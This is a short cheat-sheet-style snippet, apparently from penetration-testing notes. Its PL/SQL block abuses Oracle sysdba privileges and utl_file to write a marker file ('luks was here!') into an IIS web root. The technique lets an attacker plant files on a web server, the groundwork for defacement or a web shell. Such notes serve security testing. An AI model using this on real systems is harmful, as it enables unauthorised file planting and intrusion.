## Upload file to IIS web server via oracle DB with sysdba priv

```
declare
  f utl_file.file_type;
  s varchar(4000) := 'luks was here!';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'luks.txt', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;
```
